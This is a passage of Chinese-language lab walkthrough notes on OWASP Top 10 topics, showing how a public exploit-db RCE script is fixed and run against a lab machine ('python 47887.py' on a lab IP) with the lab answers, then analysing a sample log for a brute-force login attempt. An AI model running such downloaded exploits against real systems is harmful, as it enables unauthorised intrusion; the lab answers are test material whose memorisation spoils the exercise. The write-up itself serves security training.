有时候，第一次执行exp可能并不会起作用，所以了解脚本相关的编程语言会对我们进行漏洞利用有所帮助，如果需要的话，你可以尝试修复任何exp执行错误或者进行任何exp内容的修改工作，因为 exploit-db 上的很多脚本都需要经过修改才能被成功执行。

幸运的是，在本例中的exp相关错误是由本应被注释的行所引起的，因此我们很容易修复该exp--我们将以下代码行注释即可：

![image-20221207172421592](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207172421592.png)

解决以上问题之后，让我们再次尝试运行exp。

![image-20221207172547885](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20221207172547885.png)

我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让你 为了弄清楚如何使用exp脚本而去阅读数百行代码。

有时你会很容易得到应用程序的版本号，但其他时候你可能还需要挖掘 HTML 源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序所运行的版本信息。

## \[严重程度TOP9] 具有已知漏洞的组件-实验

实验：现在有一个易受攻击的应用程序，我们已知该目标具有已知漏洞的组件，我们需要通过公开的信息完成整个漏洞利用过程。

**答题**

![image-20221207173910294](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207173910294.png)

启动目标机器，用攻击机访问目标站点：

![image-20221207183040245](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207183040245.png)

在 https://www.exploit-db.com/ 搜索目标应用程序，点击下载即可：

![image-20221207183407087](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207183407087.png)

![image-20221207183637612](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207183637612.png)

在攻击机上使用exp，指定目标url参数：

> python 47887.py http://10.10.52.29/

![image-20221207184053851](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207184053851.png)

> 1611

## \[严重程度TOP10] 日志记录和监控不足

在设置 Web 应用程序时，应该记录用户执行的每个操作，这些日志记录很重要，因为在发生安全事件时，日志可以用于跟踪攻击者的行为；一旦追踪到攻击者的行为，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限之后 具体执行了哪些操作，其中更大的影响包括：

* 监管损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下日志记录，不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会按照当地法律法规受到罚款或其他更严厉的处罚。
* 进一步攻击的风险：如果目标应用程序不进行日志记录，则可能无法检测到攻击者的存在，这可能会允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。

日志中存储的信息应包括：

* HTTP status codes（HTTP状态码）
* Time Stamps（时间戳）
* Usernames（用户名）
* API endpoints/page locations（API 端点/页面 位置）
* IP addresses（IP地址）

这些日志确实包含一些敏感信息，因此确保安全存储日志并将这些日志的多个副本存储在不同位置非常重要。

你可能已经注意到，在发生网络安全违规或事件后，日志记录显得尤为重要。理想的情况是 目标应用程序能够进行行为监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时（如：在攻击者入侵十天之后才检测到）尽可能地减少攻击者所造成的影响。可疑活动的常见示例包括：

* 多次未经授权的特定操作尝试：通常是身份验证尝试或者访问未经授权的资源--例如管理员页面。
* 来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户，注意：具有一定误报率。
* 使用自动化工具：特定的自动化工具可以很容易地被目标应用程序所识别，例如，检测用户所使用的 User-Agent 标头的值或用户发出请求的速度，这些特征可能表明攻击者正在使用自动化工具。
* 常见有效载荷（Payload）：在 Web 应用程序中，攻击者可能会使用跨站点脚本 (XSS)等一系列有效载荷，通过检测这些有效载荷的使用情况 就可以得知是否有人在对目标应用程序进行未经授权/恶意测试。

仅仅检测可疑活动还不够，还需要根据影响级别对这种可疑活动进行评级；某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的行动需要优先做应急响应处理，因此应该针对性地发出告警，以引起相关管理方的注意。

接下来，我们需要通过分析示例日志文件来实践本节相关知识点。

**答题**

![image-20221207192855705](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207192855705.png)

下载本小节对应的附件，打开示例日志文件并查看其内容：

![image-20221207192913323](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207192913323.png)

![image-20221207192955916](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221207192955916.png)

分析该日志文件的内容可知：

1.在短时间内有人进行了四次登录操作，对应的可疑ip地址为：49.99.13.16

2.四次登录操作使用的是不同的用户账户，所以相关的一系列行为属于：暴力破解攻击（Brute Force）
